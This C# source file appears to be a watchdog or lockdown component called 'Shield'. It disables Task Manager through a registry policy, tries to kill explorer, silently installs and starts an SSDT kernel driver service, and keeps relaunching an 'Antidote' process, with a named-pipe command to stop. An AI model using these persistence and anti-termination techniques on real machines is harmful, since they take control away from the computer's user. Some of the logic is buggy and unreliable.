using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.IO.Pipes;
using System.Linq;
using System.ServiceProcess;
using System.Text;
using System.Threading.Tasks;
using System.Timers;
using Microsoft.Win32;
using SharpRaven;

namespace Shield
{
    class Program
    {
        private static BackgroundWorker worker;
        private static BackgroundWorker pipeWorker;
        private static string service_name = "windote";
        private static string sc_path = Path.Combine(Environment.SystemDirectory, "sc.exe");
        private static string ssdt_driver_path = Path.Combine(Environment.SystemDirectory, "drivers", "PhoenixDriver.sys");
        private static bool zombie = true;
        private static RavenClient ravenClient;

        static void Main(string[] args)
        {
            ravenClient = new RavenClient("");
            worker = new BackgroundWorker();
            pipeWorker = new BackgroundWorker();
            worker.DoWork += CheckAntidoteAlive;
            Timer timer = new Timer(2000);
            timer.Elapsed += timer_Elapsed;
            timer.Start();

            pipeWorker.DoWork += listenPipe;
            Timer workerTimer = new Timer(2000);
            workerTimer.Elapsed += pipe_timer_elapsed;
            workerTimer.Start();

            arm();
            while (true)
            {}
        }

        private static void arm()
        {
            SetTaskManager(false);

            try
            {
                foreach (Process proc in Process.GetProcessesByName("explorer.exe"))
                {
                    proc.Kill();
                }
            }
            catch (Exception ex)
            {
                ravenClient.Capture(new SharpRaven.Data.SentryEvent(ex));
            }

            // Hold this driver load mechanism. It causes BSOD
            if (!Environment.Is64BitOperatingSystem)
            {
                Console.WriteLine("Loading SSDT Kernel Driver");
                LogMessageToFile("Loading ssdt kernel driver");
                string arguments = String.Format("create {0} type= kernel binPath= {1}", service_name, ssdt_driver_path);
                LogMessageToFile("Driver arguments " + arguments);
                LogMessageToFile("SC PATH " + sc_path);
                try {
                    bool kernelServiceExists = false;
                    bool kernelServiceStopped = false;
                    ServiceController[] scServices;
                    scServices = ServiceController.GetServices();
                    foreach (ServiceController scTemp in scServices)
                    {
                        if (scTemp.ServiceName == service_name)
                        {
                            kernelServiceExists = true;
                            if (scTemp.Status == ServiceControllerStatus.Stopped)
                                kernelServiceStopped = true;
                            break;
                                
                        }
                    }
                    if (!kernelServiceExists)
                    {
                        LogMessageToFile("About to create driver");
                        Process process = new Process();
                        // Configure the process using the StartInfo properties.
                        process.StartInfo.FileName = sc_path;
                        process.StartInfo.Arguments = arguments;
                        process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                        process.Start();
                        process.WaitForExit();
                        Console.WriteLine("Created SSDT Kernel driver");
                        LogMessageToFile("Created driver");
                    }

                    LogMessageToFile("About to start driver");
                    if (kernelServiceStopped)
                    {
                        Process start_process = new Process();
                        // Configure the process using the StartInfo properties.
                        start_process.StartInfo.FileName = sc_path;
                        start_process.StartInfo.Arguments = "start " + service_name;
                        start_process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                        start_process.Start();
                        start_process.WaitForExit();
                        Console.WriteLine("Loaded SSDT Kernel Driver");
                        LogMessageToFile("Started driver");
                    }
                }
                catch (Exception e)
                {
                    Console.WriteLine(e.ToString());
                    ravenClient.Capture(new SharpRaven.Data.SentryEvent(e));
                }
            }

            SetTaskManager(true);
        }

        private static void disarm()
        {
            zombie = false;
            SetTaskManager(true);
            Process end_process = new Process();
            // Configure the process using the StartInfo properties.
            end_process.StartInfo.FileName = sc_path;
            end_process.StartInfo.Arguments = "stop " + service_name;
            end_process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            end_process.Start();
            end_process.WaitForExit();

            Process del_process = new Process();
            // Configure the process using the StartInfo properties.
            del_process.StartInfo.FileName = sc_path;
            del_process.StartInfo.Arguments = "delete " + service_name;
            del_process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            del_process.Start();
            del_process.WaitForExit();

            Process.Start(Path.Combine(Environment.GetEnvironmentVariable("windir"), "explorer.exe"));
        }

        static void timer_Elapsed(object sender, ElapsedEventArgs e)
        {
            if (!worker.IsBusy && zombie)
            {
                worker.RunWorkerAsync();
            }
        }

        private static void CheckAntidoteAlive(object sender, DoWorkEventArgs e)
        {
            Process[] antidote_process = null;
            try
            {
                antidote_process = Process.GetProcessesByName("Antidote");
            }
            catch (InvalidOperationException exception)
            {
                Console.WriteLine(exception.ToString());
                LogMessageToFile(exception.ToString());
                ravenClient.Capture(new SharpRaven.Data.SentryEvent(exception));
            }
            if (antidote_process.Length == 0)
            {
                var antidote_path = Path.Combine(Environment.SystemDirectory, "antidote");
                var antidote_client_path = Path.Combine(antidote_path, "Antidote.exe");
                var dummy_path = Path.Combine(Environment.SystemDirectory, "antidote", "dummy.exe");
                try { 
                    Process process = new Process();
                    // Configure the process using the StartInfo properties.
                    process.StartInfo.FileName = dummy_path;
                    process.StartInfo.Arguments = String.Format("-p {0} -d {1}", antidote_client_path, antidote_path);
                    process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                    process.Start();
                    System.Threading.Thread.Sleep(10000);
                }
                catch (Exception exp)
                {
                    ravenClient.Capture(new SharpRaven.Data.SentryEvent(exp));
                }
            }
        }

        public static void SetTaskManager(bool enable)
        {
            try
            {
                RegistryKey objRegistryKey = Registry.CurrentUser.CreateSubKey(
                    @"Software\Microsoft\Windows\CurrentVersion\Policies\System");
                if (enable && objRegistryKey.GetValue("DisableTaskMgr") != null)
                    objRegistryKey.DeleteValue("DisableTaskMgr");
                else
                    objRegistryKey.SetValue("DisableTaskMgr", "1");
                objRegistryKey.Close();
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
                ravenClient.Capture(new SharpRaven.Data.SentryEvent(e));
            }
        }


        static void pipe_timer_elapsed(object sender, ElapsedEventArgs e)
        {
            if (!pipeWorker.IsBusy)
                pipeWorker.RunWorkerAsync();
        }

        static void listenPipe(object sender, DoWorkEventArgs e)
        {
            Console.WriteLine("Initiating pipe server");
            NamedPipeServerStream pipeServer =
                new NamedPipeServerStream("AntidoteShieldPipe", PipeDirection.InOut, 1);

            int threadId = System.Threading.Thread.CurrentThread.ManagedThreadId;

            // Wait for a client to connect
            Console.WriteLine("waiting for pipe client...");
            pipeServer.WaitForConnection();

            Console.WriteLine("Client connected on thread[{0}].", threadId);
            try
            {
                // Read the request from the client. Once the client has
                // written to the pipe its security token will be available.

                StreamString ss = new StreamString(pipeServer);
                string msg = ss.ReadString();
                if (msg == "STOP_REVIVING_ANTIDOTE")
                {
                    // Shutdown the entire program
                    // TODO: Add method to unload SSDT Driver
                    // 
                    System.Environment.Exit(1);
                    zombie = false;
                }
                else if (msg == "START_REVIVING_ANTIDOTE")
                {
                    zombie = true;
                }

            }
            // Catch the IOException that is raised if the pipe is broken
            // or disconnected.
            catch (IOException exception)
            {
                Console.WriteLine("ERROR: {0}", exception.Message);
                ravenClient.Capture(new SharpRaven.Data.SentryEvent(exception));
            }
            pipeServer.Close();
        }

        public static string GetTempPath()
        {
            string path = System.Environment.GetEnvironmentVariable("TEMP");
            if (!path.EndsWith("\\")) path += "\\";
            return path;
        }

        public static void LogMessageToFile(string msg)
        {
            System.IO.StreamWriter sw = System.IO.File.AppendText(
                GetTempPath() + "My Log File.txt");
            try
            {
                string logLine = System.String.Format(
                    "{0:G}: {1}.", System.DateTime.Now, msg);
                sw.WriteLine(logLine);
            }
            finally
            {
                sw.Close();
            }
        }
    }
}
